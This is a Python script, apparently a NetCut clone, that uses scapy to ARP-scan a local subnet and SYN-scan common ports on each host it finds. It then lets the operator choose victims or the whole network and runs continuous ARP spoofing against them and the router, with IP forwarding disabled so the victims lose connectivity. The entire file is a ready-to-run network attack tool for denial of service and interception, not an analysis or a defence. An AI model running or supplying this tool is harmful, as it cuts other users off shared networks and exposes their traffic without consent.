import time
import os
import sys
import threading
import ctypes
from scapy.all import ARP, Ether, srp, send, IP, TCP, sr1, get_if_addr, conf

G = "\033[92m"  # Green
R = "\033[91m"  # Red
Y = "\033[93m"  # Yellow
B = "\033[94m"  # Blue
C = "\033[96m"  # Cyan
W = "\033[39m"  # White
RESET = "\033[0m"

if os.name == "nt":
    os.system("")

SUBNET      = "192.168.1.0/24"
ROUTER_IP   = "192.168.1.1"
INTERVAL    = 1.5   

COMMON_PORTS = [21, 22, 23, 80, 139, 443, 445, 3306, 8080]

stop_event = threading.Event()
dict_lock = threading.Lock()  
targets: dict = {}   
router_mac: str = ""

def is_admin() -> bool:
    if os.name == "posix":
        return os.geteuid() == 0
    elif os.name == "nt":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    return False


def scan_network(ip_range: str) -> list[dict]:
    print(f"{Y}[*]{W} Starting Network Scan on {C}{ip_range}{W}...")
    
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(pkt, timeout=4, retry=2, verbose=False)
    
    try:
        my_ip = get_if_addr(conf.iface)
    except:
        my_ip = None

    hosts = []
    seen_ips = set()

    for _, r in answered:
        if r.psrc in seen_ips:
            continue
        if r.psrc == ROUTER_IP or r.psrc == my_ip:
            continue
        
        hosts.append({"ip": r.psrc, "mac": r.hwsrc})
        seen_ips.add(r.psrc)
        
    hosts.sort(key=lambda x: [int(num) for num in x["ip"].split(".")])
    return hosts


def get_mac(ip: str) -> str | None:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=3, retry=2, verbose=False)
    return answered[0][1].hwsrc if answered else None


def scan_target_ports(target_ip: str, discovered_ports_dict: dict):
    open_ports = []
    for port in COMMON_PORTS:
        print(f"\r{Y}[*]{W} Scanning: {C}{target_ip}{W} -> Port {Y}{port}{W}   ", end="", flush=True)
        
        syn_pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(syn_pkt, timeout=0.8, verbose=False)
        
        if response and response.haslayer(TCP):
            if response[TCP].flags == 0x12:  
                rst_pkt = IP(dst=target_ip) / TCP(dport=port, flags="R")
                send(rst_pkt, verbose=False)
                
                service = "Unknown"
                if port in [80, 8080]: service = "HTTP"
                elif port == 443: service = "HTTPS"
                elif port == 22: service = "SSH"
                elif port == 21: service = "FTP"
                elif port == 445: service = "SMB"
                
                open_ports.append(f"{port}({service})")
                
    discovered_ports_dict[target_ip] = open_ports


def mass_port_scan(hosts: list[dict]) -> dict:
    print(f"{Y}[*]{W} Running port scan...")
    threads = []
    scan_results = {}
    
    for host in hosts:
        t = threading.Thread(target=scan_target_ports, args=(host["ip"], scan_results))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print(f"\r{G}[+]{W} Port scan completed successfully!                      \n")
    return scan_results


def spoof_loop(target_ip: str, target_mac: str):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=ROUTER_IP), verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP, hwdst=router_mac, psrc=target_ip), verbose=False)
        
        with dict_lock:
            if target_ip in targets:
                targets[target_ip]["packets"] += 2
        time.sleep(INTERVAL)

def restore_all():
    print(f"\n{Y}[*]{W} Restoring original network state...")
    for ip, data in list(targets.items()):
        target_mac = data["mac"]
        send(ARP(op=2, pdst=ip, hwdst=target_mac, psrc=ROUTER_IP, hwsrc=router_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP, hwdst=router_mac, psrc=ip, hwsrc=target_mac), count=4, verbose=False)
        print(f"{G}[+]{W} Network cache cleared for: {ip}")
    print(f"{RESET}")

def set_ip_forward(value: int):
    if os.name == "posix":
        os.system(f"echo {value} > /proc/sys/net/ipv4/ip_forward")


def main():
    global router_mac

    if not is_admin():
        if os.name == "posix":
            print(f"{R}[!] Error: Please run this script with 'sudo'.{RESET}")
        else:
            print(f"{R}[!] Error: Please run this terminal as Administrator.{RESET}")
        sys.exit(1)

    os.system("cls" if os.name == "nt" else "clear")

    print(f"{G} ______       _   _      _   _____       _   ")
    print(f"{G}|  ___|      | \ | |    | | /  __ \     | |  ")
    print(f"{G}| |_ _____  _|  \| | ___| |_| /  \/_   _| |_ ")
    print(f"{G}|  _/ _ \ \/ / . ` |/ _ \ __| |   | | | | __|")
    print(f"{G}| ||  __/>  <| |\  |  __/ |_| \__/\ |_| | |_ ")
    print(f"{G}\_| \___/_/\_\_| \_/\___|\__|\____/\__,_|\__|")
    print(f"{RESET}")

    print(f"{Y}[*]{W} Locating router MAC address ({C}{ROUTER_IP}{W})...")
    router_mac = get_mac(ROUTER_IP)
    if not router_mac:
        print(f"{R}[!] Error: Router {ROUTER_IP} is unreachable. Exiting.{RESET}")
        sys.exit(1)
    print(f"{G}[+]{W} Router identified: {G}{ROUTER_IP}{W} -> {G}{router_mac}{W}\n")

    hosts = scan_network(SUBNET)
    if not hosts:
        print(f"{R}[!] Error: No active network targets found. Check subnet.{RESET}")
        sys.exit(1)

    port_results = mass_port_scan(hosts)

    print(f"{G}[+]{W} Active Network Hosts Summary (Found {len(hosts)} targets):")
    print(f"{C}{'-'*75}{W}")
    print(f"{'ID':<5} {'IP ADDRESS':<18} {'MAC ADDRESS':<20} {'OPEN PORTS':<20}")
    print(f"{C}{'-'*75}{W}")
    
    for idx, h in enumerate(hosts):
        ip = h["ip"]
        ports_str = ", ".join(port_results.get(ip, [])) if port_results.get(ip) else "None"
        print(f"[{G}{idx:>2}{W}] {ip:<18} {h['mac']:<20} {G}{ports_str:<20}{W}")
    print(f"{C}{'-'*75}{W}")

    print(f"\n{Y}[+]{W} Select Target Menu:")
    print(f"  {G}0,1,etc{W} Specific target IDs")
    print(f"  {G}all   {W} Entire local network")
    
    
    selected_hosts = []
    while True:
       user_input = input(f"\n\033[1mchoice > {RESET}").strip().lower()
       if user_input == "all":
           selected_hosts = hosts
           break
       else:
           try:
               indices = [int(i.strip()) for i in user_input.split(",")]
               for idx in indices:
                   selected_hosts.append(hosts[idx])
               break
           except (ValueError, IndexError):
               print(f"{R}[!] Error: Invalid selection. Exiting.{RESET}")
               
    print(f"{C}--------------------")
    print(f"\n{G}[!] Starting NetCut attack loops{W}")
    set_ip_forward(0)  
    
    for h in selected_hosts:
        ip = h["ip"]
        targets[ip] = {"mac": h["mac"], "packets": 0}

    for ip, data in targets.items():
        t = threading.Thread(target=spoof_loop, args=(ip, data["mac"]), daemon=True)
        targets[ip]["thread"] = t
        t.start()
        print(f"{Y}[*]{W} Target added to attack loop -> {C}{ip}{W}")

    print(f"\n{G}[+]{W} Target isolation is active.")
    print(f"{R}[*]{W} Press {R}Ctrl + C{W} to stop and restore network\n")
    print(f"{C}--------------------")

    try:
        while True:
            with dict_lock:
                total_packets = sum(d["packets"] for d in targets.values())
            print(f"\r{Y}[~]{W} Attack status: Active | Packets dispatched: {G}{total_packets}{W}", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()  
        time.sleep(1.2)   
        restore_all()     
        set_ip_forward(1) 
        print(f"\n{G}[+]{W} Tool closed\n")

if __name__ == "__main__":
    main()